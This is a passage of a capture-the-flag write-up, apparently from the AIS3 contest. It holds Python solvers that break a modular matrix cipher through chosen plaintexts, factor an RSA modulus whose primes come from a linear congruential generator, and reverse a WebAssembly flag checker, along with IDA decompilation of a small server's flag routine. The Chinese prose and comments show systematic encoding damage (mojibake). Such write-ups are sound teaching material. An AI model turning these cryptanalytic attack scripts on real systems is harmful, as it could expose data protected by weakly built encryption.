    payload += e + blk_q
io.recvuntil(b"input: ")
io.sendline(payload)

# â”€â”€ 2. æŠŠ 16 å¡Šå¯†æ–‡å…¨éƒ¨è®€åˆ° EOF â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
raw = io.recvall(timeout=2)
chosen_ct = [np.array(list(map(int, num_pat.findall(ln))), dtype=int) % P
             for ln in raw.splitlines() if b'[' in ln]

if len(chosen_ct) != 16:
    log.error(f"é æœŸ 16 å¡Šå¯†æ–‡ï¼Œå¯¦éš›æ”¶åˆ° {len(chosen_ct)} å¡Šï¼Œè«‹é–‹ debug æ¢æŸ¥")
    exit()

# â”€â”€ 3. å»ºç«‹ 128Ã—128 è¯ç«‹æ–¹ç¨‹  MÂ·x = y  (x=Flatten(A|B)) â”€â”€â”€â”€â”€â”€â”€â”€
rows, rhs = [], []
for i in range(16):
    Pi    = np.frombuffer(payload[i*N:(i+1)*N], dtype=np.uint8)
    Pprev = np.frombuffer(payload[(i-1)*N:i*N], dtype=np.uint8) if i else np.zeros(N,int)
    Ci    = chosen_ct[i]
    for r in range(N):
        row = [0]*128
        # A éƒ¨åˆ†
        for c in range(N):
            row[r*8 + c] = Pi[c] % P
        # B éƒ¨åˆ†
        for c in range(N):
            row[64 + r*8 + c] = Pprev[c] % P
        rows.append(row)
        rhs.append(Ci[r] % P)

M = np.array(rows, dtype=int) % P
y = np.array(rhs,  dtype=int) % P

# â”€â”€ 4. é«˜æ–¯æ¶ˆå…ƒ (mod 251) è§£å‡º Aã€B â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def gauss_mod(A, b):
    n = A.shape[0]
    aug = np.hstack((A, b.reshape(-1,1))).astype(int) % P
    col = 0
    for row in range(n):
        piv = next((r for r in range(row, n) if aug[r,col]), None)
        while piv is None:
            col += 1
            piv = next((r for r in range(row, n) if aug[r,col]), None)
        aug[[row,piv]] = aug[[piv,row]]
        inv = pow(int(aug[row,col]), -1, P)
        aug[row] = (aug[row]*inv) % P
        for r in range(n):
            if r!=row and aug[r,col]:
                aug[r] = (aug[r] - aug[r,col]*aug[row]) % P
        col += 1
    return aug[:,-1] % P

sol = gauss_mod(M, y)
A = sol[:64].reshape(N,N) % P
B = sol[64:].reshape(N,N) % P

# â”€â”€ 5. æ¨¡é€† Aï¼ˆ8Ã—8ï¼‰â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def inv8(mat):
    m = mat.copy() % P
    I = np.eye(N, dtype=int)
    for i in range(N):
        if m[i,i] == 0:
            for k in range(i+1, N):
                if m[k,i]:
                    m[[i,k]], I[[i,k]] = m[[k,i]], I[[k,i]]
                    break
        inv = pow(int(m[i,i]), -1, P)
        m[i] = (m[i]*inv) % P
        I[i] = (I[i]*inv) % P
        for k in range(N):
            if k!=i and m[k,i]:
                fac = m[k,i]
                m[k] = (m[k]-fac*m[i]) % P
                I[k] = (I[k]-fac*I[i]) % P
    return I % P

A_inv = inv8(A)

# â”€â”€ 6. è§£å¯†æ——æ¨™ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
P_blocks = []
for i, Ci in enumerate(flag_ct):
    if i == 0:
        Pi = (A_inv @ Ci) % P
    else:
        Pi = (A_inv @ ((Ci - (B @ P_blocks[i-1])) % P)) % P
    P_blocks.append(Pi)

plain = bytearray()
for blk in P_blocks:
    plain += bytes(int(x) for x in blk)
flag = plain.rstrip(b'\x00').decode(errors='ignore')

print(f"\n[+] FLAG = {flag}")

```

---

### Random_RSA
![image](https://hackmd.io/_uploads/H1LQa-RMel.png)

é€™é¡Œ CTF (Capture The Flag) çš„å¯†ç¢¼å­¸æŒ‘æˆ° "random_RSA" è¦æ±‚æˆ‘å€‘ç ´è§£ä¸€å€‹ RSA åŠ å¯†ã€‚å…¶ç‰¹æ®Šä¹‹è™•åœ¨æ–¼ RSA æ¨¡æ•¸ `n` çš„è³ªå› æ•¸ `p` å’Œ `q` æ˜¯ç”±ä¸€å€‹ç·šæ€§åŒé¤˜ç”¢ç”Ÿå™¨ (LCG) ç”Ÿæˆçš„ã€‚è§£é¡Œçš„é—œéµåœ¨æ–¼å…ˆé‚„åŸ LCG çš„åƒæ•¸ï¼Œç„¶å¾Œåˆ©ç”¨ `p` å’Œ `q` ä¹‹é–“å·²çŸ¥çš„ LCG ç”Ÿæˆé—œä¿‚ä¾†æ‰¾å‡ºå®ƒå€‘ï¼Œæœ€çµ‚è§£å¯†è¨Šæ¯ã€‚


**1. ç·šæ€§åŒé¤˜ç”¢ç”Ÿå™¨ (LCG) åƒæ•¸æ´©æ¼**

æŒ‘æˆ°ä¸­ä½¿ç”¨çš„ LCG å®šç¾©ç‚º `rng(x) = (a*x + b) % m`ã€‚

`output.txt` æª”æ¡ˆæä¾›äº† LCG çš„æ¨¡æ•¸ `M` (å³ `m`) ä»¥åŠä¸‰å€‹é€£çºŒçš„ LCG è¼¸å‡ºå€¼ `h0`, `h1`, `h2`ï¼š
- `h0 = rng(seed_hint)`
- `h1 = rng(h0) = (a*h0 + b) % M`
- `h2 = rng(h1) = (a*h1 + b) % M`

å¾ `h1` å’Œ `h2` çš„å®šç¾©ï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹é—œæ–¼æœªçŸ¥æ•¸ `a` å’Œ `b` ï¼ˆLCG çš„ä¹˜æ•¸å’Œå¢é‡ï¼‰çš„ç·šæ€§æ–¹ç¨‹çµ„ï¼ˆæ¨¡ `M`ï¼‰ï¼š

```
1. h1 â‰¡ a Â· h0 + b (mod M)
2. h2 â‰¡ a Â· h1 + b (mod M)
```

å°‡ç¬¬äºŒå¼æ¸›å»ç¬¬ä¸€å¼ï¼Œå¯å¾—ï¼š

```
h2 - h1 â‰¡ a Â· (h1 - h0) (mod M)
```

å› æ­¤ï¼Œåƒæ•¸ `a` å¯ä»¥è¡¨ç¤ºç‚ºï¼š

```
a â‰¡ (h2 - h1) Â· (h1 - h0)^(-1) (mod M)
```

ä¸€æ—¦è¨ˆç®—å‡º `a`ï¼Œå°±å¯ä»¥å°‡å…¶ä»£å›ä»»ä¸€ç­‰å¼ä»¥æ±‚è§£ `b`ï¼š

```
b â‰¡ h1 - a Â· h0 (mod M)
```

ç”±æ–¼ `M` æ˜¯é€šé `getPrime(512)` ç”Ÿæˆçš„ä¸€å€‹ 512 ä½è³ªæ•¸ï¼Œåªè¦ `h1 - h0 â‰¢ 0 (mod M)`ï¼Œæ¨¡é€†å…ƒ `(h1 - h0)^(-1) (mod M)` å°±å¿…å®šå­˜åœ¨ã€‚

**2. RSA è³ªæ•¸ p å’Œ q çš„ç”Ÿæˆ**

RSA æ¨¡æ•¸ `n = p Â· q`ã€‚

è³ªæ•¸ `p` å’Œ `q` çš„ç”Ÿæˆæ–¹å¼å¦‚ä¸‹ï¼š
- `p = genPrime(seed)`ï¼Œå…¶ä¸­ `seed` æ˜¯ä¸€å€‹ 300 ä½å…ƒçš„è³ªæ•¸
- `q = genPrime(p)`

å‡½å¼ `genPrime(x_seed)` çš„é‹ä½œæ–¹å¼æ˜¯ï¼š
1. `x = rng(x_seed)` (ç¬¬ä¸€æ¬¡è¿­ä»£)
2. `while not is_prime(x):`
3. `x = rng(x)` (å¾ŒçºŒè¿­ä»£)
4. `return x`

é€™è¡¨ç¤º `p` æ˜¯å¾æŸå€‹åˆå§‹ç¨®å­ `seed` é–‹å§‹ï¼Œé€šé LCG åè¦†é‹ç®—ç›´åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€å€‹è³ªæ•¸ã€‚è€Œ `q` å‰‡æ˜¯å°‡ `p` ä½œç‚ºç¨®å­ï¼ŒåŒæ¨£é€šé LCG åè¦†é‹ç®—ç›´åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€å€‹è³ªæ•¸ã€‚

ä»¤ `k_q` ç‚ºå¾ `p` é–‹å§‹ï¼Œå‘¼å« `rng` å‡½å¼ç›´åˆ°ç”Ÿæˆè³ªæ•¸ `q` çš„ç¸½æ¬¡æ•¸ã€‚å‰‡ `q` å¯ä»¥è¡¨ç¤ºç‚ºï¼š

```
q â‰¡ (a^(k_q) Â· p + (Î£(i=0 to k_q-1) a^i) Â· b) (mod M)
```

ä»¤ï¼š
```
A_k = a^(k_q) (mod M)
B_k = (Î£(i=0 to k_q-1) a^i) Â· b (mod M)
```

å‰‡ï¼š
```
q â‰¡ A_k Â· p + B_k (mod M)
```

**3. å°‹æ‰¾ p å’Œ q**

ç”±æ–¼ `0 < p < M` å’Œ `0 < q < M`ï¼Œä¸Šè¿°åŒé¤˜å¼æ„å‘³è‘— `q = A_k Â· p + B_k - cÂ·M` å°æ–¼æŸå€‹éè² æ•´æ•¸ `c` æˆç«‹ã€‚ç„¶è€Œï¼Œå› ç‚º `A_k Â· p + B_k` çš„çµæœç¶“é `mod M` é‹ç®—å¾Œæ‰æ˜¯ `q`ï¼Œæ‰€ä»¥é€šå¸¸ `c = âŒŠ(A_k Â· p + B_k) / MâŒ‹`ã€‚

ä¸€å€‹æ›´ç‚ºç›´æ¥çš„æ–¹æ³•æ˜¯åˆ©ç”¨ `q â‰¡ A_k Â· p + B_k (mod M)` å’Œ `n = pÂ·q`ã€‚

å°‡ `q = n/p` ä»£å…¥ï¼Œå¯å¾—ï¼š
```
n/p â‰¡ A_k Â· p + B_k (mod M)
```

å‡è¨­ `p â‰¢ 0 (mod M)`ï¼ˆå› ç‚º `p` æ˜¯è³ªæ•¸ä¸” `p < M`ï¼Œé€™æ˜¯åˆç†çš„ï¼‰ï¼Œå…©é‚ŠåŒä¹˜ä»¥ `p`ï¼š
```
n â‰¡ A_k Â· pÂ² + B_k Â· p (mod M)
```

æ•´ç†å¾Œå¾—åˆ°ä¸€å€‹æ¨¡ `M` çš„äºŒæ¬¡åŒé¤˜æ–¹ç¨‹ï¼š
```
A_k Â· pÂ² + B_k Â· p - n â‰¡ 0 (mod M)
```

**è§£é¡Œç­–ç•¥ï¼š**

æˆ‘å€‘çš„ç­–ç•¥æ˜¯è¿­ä»£ `k_q`ï¼ˆå³ `genPrime(p)` ä¸­ `rng` çš„å‘¼å«æ¬¡æ•¸ï¼‰ã€‚`k_q` é æœŸæ˜¯ä¸€å€‹ç›¸å°è¼ƒå°çš„å€¼ï¼ˆä¾‹å¦‚ï¼Œ1 åˆ°å¹¾åƒï¼‰ã€‚å°æ–¼æ¯ä¸€å€‹ `k_q` å€¼ï¼š

1. è¨ˆç®— `A_k = a^(k_q) (mod M)`

2. è¨ˆç®— `B_k = (Î£(i=0 to k_q-1) a^i) Â· b (mod M)`
   - å¦‚æœ `a = 1`ï¼Œå‰‡ `Î£(i=0 to k_q-1) a^i = k_q (mod M)`
   - å¦å‰‡ï¼Œ`Î£(i=0 to k_q-1) a^i = (a^(k_q) - 1) Â· (a - 1)^(-1) (mod M)`

3. è§£äºŒæ¬¡åŒé¤˜æ–¹ç¨‹ `A_k Â· xÂ² + B_k Â· x - n â‰¡ 0 (mod M)`
   - ç”±æ–¼ `M` æ˜¯è³ªæ•¸ï¼Œæ­¤æ–¹ç¨‹æœ€å¤šæœ‰å…©å€‹è§£
   - å¯ä»¥ä½¿ç”¨ Tonelli-Shanks æ¼”ç®—æ³•æˆ–å…¶è®Šé«”ä¾†æ±‚è§£

4. å°æ–¼å¾—åˆ°çš„æ¯å€‹è§£ `xâ‚€`ï¼Œå®ƒå°±æ˜¯ `p` çš„ä¸€å€‹å€™é¸å€¼ï¼ˆå› ç‚º `0 < p < M`ï¼Œæ‰€ä»¥ `p = xâ‚€`ï¼‰
   - a. é©—è­‰ `xâ‚€` æ˜¯å¦ç‚º `n` çš„å› å­
   - b. è‹¥æ˜¯ï¼Œå‰‡è¨ˆç®— `q_cand = n / xâ‚€`
   - c. é©—è­‰ `p_cand = xâ‚€` å’Œ `q_cand` æ˜¯å¦å‡ç‚ºè³ªæ•¸ï¼ˆå¯ä½¿ç”¨ `gmpy2.is_prime` æª¢æŸ¥ï¼‰
   - d. **é—œéµé©—è­‰**ï¼šæ¨¡æ“¬ `genPrime(p_cand)` çš„éç¨‹ï¼Œç¢ºèªåœ¨æ°å¥½ `k_q` æ¬¡ `rng` è¿­ä»£å¾Œå¾—åˆ° `q_cand`ï¼Œä¸¦ä¸”åœ¨å‰ `k_q - 1` æ¬¡è¿­ä»£ä¸­æ²’æœ‰ç”¢ç”Ÿå…¶ä»–è³ªæ•¸

ä¸€æ—¦æ‰¾åˆ°æ­£ç¢ºçš„ `p` å’Œ `q`ï¼Œå°±å¯ä»¥ï¼š
- è¨ˆç®— `Ï†(n) = (p - 1)(q - 1)`
- è¨ˆç®—ç§é‘° `d â‰¡ e^(-1) (mod Ï†(n))`
- è§£å¯†å¯†æ–‡ `m_int = c^d (mod n)`
- å°‡å…¶è½‰æ›ç‚ºæ——å¹Ÿå­—ä¸²

Payload:
```python
from Crypto.Util.number import long_to_bytes
from sympy.ntheory.residue_ntheory import sqrt_mod
import gmpy2

# LCG å‡½æ•¸ (ç”¨æ–¼é©—è­‰)
def rng(x_val, a_lcg, b_lcg, m_lcg):
    return (a_lcg * x_val + b_lcg) % m_lcg

# è§£æ output.txt çš„å‡½æ•¸
def parse_output(filename="output.txt"):
    data = {}
    try:
        with open(filename, "r") as f:
            for line in f:
                parts = line.strip().split(" = ")
                if len(parts) == 2:
                    data[parts[0]] = int(parts[1])
                else:
                    print(f"è­¦å‘Šï¼šç„¡æ³•è§£æè¡Œ: {line.strip()}")
        # æª¢æŸ¥æ˜¯å¦æ‰€æœ‰å¿…è¦çš„éµéƒ½å­˜åœ¨
        required_keys = ['h0', 'h1', 'h2', 'M', 'n', 'e', 'c']
        for key in required_keys:
            if key not in data:
                raise ValueError(f"éŒ¯èª¤ï¼šè¼¸å…¥æ–‡ä»¶ '{filename}' ä¸­ç¼ºå°‘éµ '{key}'ã€‚")
        return data
    except FileNotFoundError:
        print(f"éŒ¯èª¤ï¼šæ‰¾ä¸åˆ°è¼¸å…¥æ–‡ä»¶ '{filename}'ã€‚è«‹ç¢ºä¿å®ƒèˆ‡è…³æœ¬åœ¨åŒä¸€ç›®éŒ„ä¸­ã€‚")
        exit(1)
    except ValueError as e:
        print(e)
        exit(1)


# ä¸»è¦è§£é¡Œé‚è¼¯
def solve():
    # 1. è§£æè¼¸å…¥
    print("æ­£åœ¨è§£æè¼¸å…¥æ–‡ä»¶...")
    output_data = parse_output()
    h0 = output_data['h0']
    h1 = output_data['h1']
    h2 = output_data['h2']
    M = output_data['M']
    n = output_data['n']
    e_val = output_data['e']
    c_val = output_data['c']

    print("å¾ output.txt è®€å–çš„åƒæ•¸:")
    print(f"M = {M}")
    print(f"n = {n}")
    print(f"e = {e_val}")
    print("-" * 30)

    # 2. é‚„åŸ LCG åƒæ•¸ a, b
    print("æ­£åœ¨é‚„åŸ LCG åƒæ•¸ (a, b)...")
    diff_h0_h1 = (h1 - h0 + M) % M
    if diff_h0_h1 == 0:
        print("éŒ¯èª¤ï¼šh1 - h0 ç‚º 0 mod Mï¼Œç„¡æ³•è¨ˆç®—é€†å…ƒã€‚")
        return

    try:
        inv_diff_h0_h1 = pow(diff_h0_h1, -1, M)
    except ValueError:
        print(f"éŒ¯èª¤ï¼šç„¡æ³•è¨ˆç®— (h1 - h0)^-1 mod Mã€‚gcd(h1-h0, M) != 1ã€‚")
        return
        
    a = ((h2 - h1 + M) % M * inv_diff_h0_h1) % M
    b = (h1 - (a * h0) % M + M) % M

    print("å·²é‚„åŸçš„ LCG åƒæ•¸:")
    print(f"a = {a}")
    print(f"b = {b}")
    print("-" * 30)

    # 3. è¿­ä»£ k_q å°‹æ‰¾ p å’Œ q
    print("é–‹å§‹è¿­ä»£æœå°‹ p å’Œ q...")
    max_k_q = 3000  # æ­¤ä¸Šé™å¯èƒ½éœ€è¦æ ¹æ“šå¯¦éš›æƒ…æ³èª¿æ•´

    found_p = None
    found_q = None

    for k_q in range(1, max_k_q + 1):
        if k_q % 100 == 0:  # é€²åº¦æŒ‡ç¤º
            print(f"æ­£åœ¨å˜—è©¦ k_q = {k_q}...")

        A_k = pow(a, k_q, M)

        if a == 1:
            S_k = k_q % M
        else:
            try:
                inv_a_minus_1 = pow(a - 1, -1, M)
                S_k = (pow(a, k_q, M) - 1 + M) % M * inv_a_minus_1 % M
            except ValueError:
                # print(f"è­¦å‘Šï¼šåœ¨ k_q={k_q} æ™‚ç„¡æ³•è¨ˆç®— (a-1)^-1ã€‚è·³éã€‚") # é€šå¸¸ä¸æ‡‰ç™¼ç”Ÿ
                continue
        
        B_k = (S_k * b) % M
        
        if A_k == 0:
            continue

        C_k_term = (-n % M + M) % M

        delta = (pow(B_k, 2, M) - (4 * A_k % M * C_k_term % M) + M) % M
        
        sqrt_delta_list = sqrt_mod(delta, M, True)

        if not sqrt_delta_list:
            continue
            
        try:
            inv_2A_k = pow(2 * A_k, -1, M)
        except ValueError:
            # print(f"è­¦å‘Šï¼šåœ¨ k_q={k_q} æ™‚ç„¡æ³•è¨ˆç®— (2*A_k)^-1ã€‚è·³éã€‚") # é€šå¸¸ä¸æ‡‰ç™¼ç”Ÿ
            continue

        possible_p_values = []
        for s_delta in sqrt_delta_list:
            p_cand = ((-B_k + s_delta + M) % M * inv_2A_k) % M
            possible_p_values.append(p_cand)
        
        possible_p_values = list(set(possible_p_values))

        for p_cand in possible_p_values:
            if p_cand == 0:
                continue

            if n % p_cand != 0:
                continue
            
            q_cand = n // p_cand

            if q_cand == 0 or p_cand == q_cand :
                continue

            if not (gmpy2.is_prime(p_cand) and gmpy2.is_prime(q_cand)):
                continue

            current_X = p_cand
            valid_path = True
            generated_q_candidate = -1

            for j in range(1, k_q + 1):
                current_X = rng(current_X, a, b, M)
                if j < k_q:
                    if gmpy2.is_prime(current_X):
                        valid_path = False
                        break
                elif j == k_q:
                    generated_q_candidate = current_X
            
            if not valid_path:
                continue

            if generated_q_candidate == q_cand and gmpy2.is_prime(generated_q_candidate):
                found_p = p_cand
                found_q = q_cand
                print(f"\nğŸ‰ æˆåŠŸæ‰¾åˆ° p å’Œ q (k_q = {k_q}):")
                print(f"p = {found_p}")
                print(f"q = {found_q}")
                break 
        
        if found_p:
            break

    if not found_p:
        print(f"\nğŸ˜” åœ¨ k_q <= {max_k_q} çš„é™åˆ¶å…§æœªèƒ½æ‰¾åˆ° p å’Œ qã€‚")
        return

    print("-" * 30)
    # 4. RSA è§£å¯†
    print("æ­£åœ¨åŸ·è¡Œ RSA è§£å¯†...")
    phi = (found_p - 1) * (found_q - 1)
    
    if gmpy2.gcd(e_val, phi) != 1:
        print(f"éŒ¯èª¤ï¼še ({e_val}) å’Œ phi ({phi}) ä¸äº’è³ªã€‚ç„¡æ³•è¨ˆç®— dã€‚")
        return

    try:
        d_val = pow(e_val, -1, phi)
    except ValueError:
        print(f"éŒ¯èª¤ï¼šç„¡æ³•è¨ˆç®— e^-1 mod phiã€‚gcd(e, phi) != 1ã€‚") # ç†è«–ä¸Šè‹¥ gcd!=1, pow æœƒå ±éŒ¯
        return

    m_int = pow(c_val, d_val, n)
    
    try:
        flag_bytes = long_to_bytes(m_int)
        try:
            flag_str = flag_bytes.decode('utf-8')
            print(f"\nğŸš© è§£å¯†å¾Œçš„æ——å¹Ÿ: {flag_str}")
        except UnicodeDecodeError:
            print(f"\nğŸš© è§£å¯†å¾Œçš„æ——å¹Ÿ (ç„¡æ³•ä»¥ UTF-8 è§£ç¢¼ï¼Œé¡¯ç¤ºåŸå§‹ä½å…ƒçµ„): {flag_bytes}")
            
    except Exception as e:
        print(f"\nç„¡æ³•å°‡è§£å¯†å¾Œçš„æ•¸å­—è½‰æ›ç‚ºä½å…ƒçµ„: {e}")
        print(f"è§£å¯†å¾Œçš„æ•´æ•¸: {m_int}")

# åŸ·è¡Œè§£é¡Œå‡½æ•¸
if __name__ == "__main__":
    solve()
```

---

## Rev
### Web flag checker
![image](https://hackmd.io/_uploads/HJ2DYeCGel.png)

æ‰“é–‹ç¶²é å¾Œ F12 å¯ä»¥çœ‹åˆ° `.wasm` WebAssembly code (å¯åˆ©ç”¨ JEB decompiler å·¥å…·) åçµ„è­¯å¾Œæœƒå¾—åˆ°`.wat` code

æ‰¾åˆ° `flagchecker function` 
ref : https://developer.mozilla.org/zh-TW/docs/WebAssembly

Ddisassembly :
```python
int flagchecker(int param0) {
    // å»ºç«‹è‡¨æ™‚å„²å­˜å€ï¼ˆstack æ¨¡æ“¬ï¼‰
    int* stack_frame = __g0 - 24;
    __g0 -= 24;

    // è®Šæ•¸å®šç¾©
    int input_addr = param0;              // ä½¿ç”¨è€…è¼¸å…¥å­—ä¸²æŒ‡æ¨™
    int shift_base = -39934163;           // ç”¨æ–¼ç”¢ç”Ÿå„å€å¡Šçš„æ—‹è½‰ä½å…ƒæ•¸
    long long targets[5];                 // é©—è­‰ç”¨çš„ç›®æ¨™æ•¸å€¼
    int result = 0;                       // å›å‚³çµæœ (0 = éŒ¯èª¤, 1 = æ­£ç¢º)
    int input_ptr;                        // ç•¶å‰è¼¸å…¥ä½ç½®æŒ‡æ¨™
    int block_index;                      // å€å¡Šç´¢å¼•
    long long current_block;             // ç•¶å‰è™•ç†çš„ 64-bit å€å¡Š
    int shift_amount;                    // å·¦æ—‹è½‰çš„ä½å…ƒæ•¸

    // åˆå§‹åŒ– target æ¯”å°å€¼
    targets[0] = 0x69282A668AEF666A;
    targets[1] = 0x633525F4D7372337;
    targets[2] = 0x9DB9A5A0DCC5DD7D;
    targets[3] = 0x9833AFAFB8381A2F;
    targets[4] = 0x6FAC8C8726464726;

    // æª¢æŸ¥è¼¸å…¥ç‚ºç©ºæŒ‡æ¨™ï¼ˆNULLï¼‰
    if (input_addr == 0) {
    loc_500001B2:
        result = 0;
    } else {
        // è¨ˆç®—è¼¸å…¥é•·åº¦
        int len = strlen((char*)input_addr);

        // å¿…é ˆæ­£å¥½æ˜¯ 40 bytes æ‰è™•ç†ï¼ˆ5 å€‹å€å¡Š Ã— 8 bytesï¼‰
        if (len == 40) {
            input_ptr = input_addr;
            block_index = 0;

            // ä¾åºè™•ç†æ¯å€‹ 8-byte å€å¡Š
            while (block_index < 5) {
                // å–å‡ºç¬¬ i å€‹å€å¡Šï¼ˆ64-bitï¼‰
                current_block = *(long long*)(input_ptr + block_index * 8);

                // ç”¢ç”Ÿè©²å€å¡Šçš„æ—‹è½‰ä½å…ƒæ•¸
                shift_amount = (unsigned int)(shift_base >> (block_index * 6)) & 0x3F;

                // å·¦æ—‹è½‰è©²å€å¡Š
                long long rotated = rotl64(current_block, shift_amount);

                // æ¯”å°æ—‹è½‰çµæœèˆ‡ç›®æ¨™å€¼æ˜¯å¦ç›¸ç¬¦
                if (targets[block_index] != rotated) {
                    result = 0;
                    __g0 = stack_frame + 24;
                    return result;
                }

                block_index++;
            }

            // å…¨éƒ¨æ¯”å°æˆåŠŸ
            result = 1;
        } else {
            // é•·åº¦ä¸ç¬¦ï¼Œç›´æ¥éŒ¯èª¤
            goto loc_500001B2;
        }
    }

    // å›å¾©æš«å­˜å€
    __g0 = stack_frame + 24;

    return result;
}

```
é©—è­‰çš„é‚è¼¯ï¼šé¦–å…ˆæª¢æŸ¥è¼¸å…¥çš„å­—ä¸²é•·åº¦æ˜¯å¦ç‚º 40 å€‹å­—å…ƒï¼Œç„¶å¾Œå°‡é€™ 40 å€‹å­—å…ƒåˆ†æˆ 5 çµ„ï¼Œæ¯çµ„ 8 å€‹å­—å…ƒã€‚æ¯çµ„æœƒè¢«ç•¶ä½œä¸€å€‹ 64 ä½å…ƒçš„æ•´æ•¸ï¼Œç¶“éä½å…ƒå³æ—‹æ“ä½œå¾Œï¼Œæ‹¿ä¾†èˆ‡ä¸€çµ„é å…ˆå®šç¾©çš„ç›®æ¨™å€¼åšæ¯”å°ã€‚

Payload :

```python
def rotr64(x, n):
    return ((x >> n) | ((x & ((1 << n) - 1)) << (64 - n))) & 0xFFFFFFFFFFFFFFFF

shift_base = (-39934163) & 0xFFFFFFFF          # ç•¶æˆ 32-bit ç„¡è™Ÿæ•¸
targets_hex = [
    "69282A668AEF666A",
    "633525F4D7372337",
    "9DB9A5A0DCC5DD7D",
    "9833AFAFB8381A2F",
    "6FAC8C8726464726",
]

shift_amounts = [ (shift_base >> (6*i)) & 0x3F for i in range(5) ]
targets = [int(x, 16) for x in targets_hex]

orig = [ rotr64(t, s) for t, s in zip(targets, shift_amounts) ]
flag  = b"".join(x.to_bytes(8, "little") for x in orig).decode()

print(flag)
```

**Flag:**
```
AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}
```

---

### AIS3 Tiny Server - Reverse
![image](https://hackmd.io/_uploads/S1nUYlRzgx.png)
![image](https://hackmd.io/_uploads/B1u-qe0zxx.png) æŠŠé¡Œç›®çµ¦çš„æª”æ¡ˆä¸Ÿé€²å» IDA
`main funation` :

```c
// bad sp value at call has been detected, the output may be wrong!
int __cdecl sub_12B0(int a1, int a2)
{
  int v2; // esi
  int v3; // eax
  char *v4; // eax
  void *v5; // ecx
  const char *v6; // edx
  int v7; // esi
  int v9; // eax
  int v10; // esi
  __pid_t v11; // eax
  int v12; // ebx
  int v13; // ebx
  socklen_t *addr_len; // [esp+4h] [ebp-140h]
  int fd; // [esp+8h] [ebp-13Ch]
  int fda; // [esp+8h] [ebp-13Ch]
  const char *fdb; // [esp+8h] [ebp-13Ch]
  const char *fdc; // [esp+8h] [ebp-13Ch]
  socklen_t v19; // [esp+18h] [ebp-12Ch] BYREF
  sockaddr addr; // [esp+1Ch] [ebp-128h] BYREF
  char buf[264]; // [esp+2Ch] [ebp-118h] BYREF
  int *v22; // [esp+134h] [ebp-10h]
  int v23; // [esp+13Ch] [ebp-8h]

  v22 = &a1;
  v2 = a1;
  fd = a2;
  if ( a1 <= 1 )
  {
    v7 = 9999;
    v4 = getcwd(buf, 0x100u);
    v19 = 16;
    v5 = v4;
LABEL_11:
    __printf_chk(1, "serve directory '%s'\n", v5, v4);
    v9 = sub_1CA0(v7);
    fda = v9;
    if ( v9 <= 0 )
    {
      perror("ERROR");
      exit(fda);
    }
    __printf_chk(1, "listen on port %d, fd is %d\n", v7, v9);
    v10 = 10;
    signal(13, (__sighandler_t)((char *)&dword_0 + 1));
    while ( 1 )
    {
      v11 = fork();
      if ( !v11 )
      {
        while ( 1 )
        {
          v13 = accept(fda, &addr, &v19);
          sub_2760(v13, (int)&addr);
          close(v13);
        }
      }
      if ( v11 > 0 )
      {
        __printf_chk(1, "child pid is %d\n", v11, v23);
        if ( !--v10 )
          goto LABEL_17;
      }
      else
      {
        perror("fork");
        if ( !--v10 )
        {
          while ( 1 )
          {
LABEL_17:
            v12 = accept(fda, &addr, &v19);
            sub_2760(v12, (int)&addr);
            close(v12);
          }
        }
      }
    }
  }
  v3 = *(_DWORD *)(a2 + 4);
  if ( (*(_BYTE *)v3 != 45 || *(_BYTE *)(v3 + 1) != 104 || *(_BYTE *)(v3 + 2)) && strcmp((const char *)v3, "--help") )
  {
    v4 = getcwd(buf, 0x100u);
    v19 = 16;
    v5 = v4;
    if ( v2 == 2 )
    {
      addr_len = (socklen_t *)v4;
      v6 = *(const char **)(fd + 4);
      if ( (unsigned __int8)(*v6 - 48) > 9u )
      {
        fdb = *(const char **)(fd + 4);
        v7 = 9999;
        v4 = (char *)chdir(v6);
        v5 = (void *)fdb;
        if ( v4 )
        {
          perror(fdb);
          exit(1);
        }
      }
      else
      {
        v4 = (char *)strtol(v6, 0, 10);
        v5 = addr_len;
        v7 = (int)v4;
      }
    }
    else if ( v2 == 3 )
    {
      v7 = strtol(*(const char **)(fd + 8), 0, 10);
      fdc = *(const char **)(fd + 4);
      v4 = (char *)chdir(fdc);
      v5 = (void *)fdc;
      if ( v4 )
      {
        perror(fdc);
        exit(1);
      }
    }
    else
    {
      v7 = 9999;
    }
    goto LABEL_11;
  }
  sub_2930();
  return 0;
}
```
~~å…¶å¯¦æˆ‘ä¸å¤ªæœƒé€†å‘~~ åœ¨ä¸€å †functionä¸­æŒ–å•ŠæŒ–å•ŠæŒ–åˆ°åœ¨ç®— flag çš„ `sub_1E20` function

```c
_BOOL4 __cdecl sub_1E20(int a1)
{
  unsigned int v1; // ecx
  char v2; // si
  char v3; // al
  int i; // eax
  char v5; // dl
  _BYTE v7[10]; // [esp+7h] [ebp-49h] BYREF
  _DWORD v8[11]; // [esp+12h] [ebp-3Eh]
  __int16 v9; // [esp+3Eh] [ebp-12h]

  v1 = 0;
  v2 = 51;
  v9 = 20;
  v3 = 114;
  v8[0] = 1480073267;
  v8[1] = 1197221906;
  v8[2] = 254628393;
  v8[3] = 920154;
  v8[4] = 1343445007;
  v8[5] = 874076697;
  v8[6] = 1127428440;
  v8[7] = 1510228243;
  v8[8] = 743978009;
  v8[9] = 54940467;
  v8[10] = 1246382110;
  qmemcpy(v7, "rikki_l0v3", sizeof(v7));
  while ( 1 )
  {
    *((_BYTE *)v8 + v1++) = v2 ^ v3;
    if ( v1 == 45 )
      break;
    v2 = *((_BYTE *)v8 + v1);
    v3 = v7[v1 % 0xA];
  }
  for ( i = 0; i != 45; ++i )
  {
    v5 = *(_BYTE *)(a1 + i);
    if ( !v5 || v5 != *((_BYTE *)v8 + i) )
      return 0;
  }
  return *(_BYTE *)(a1 + 45) == 0;
}
```
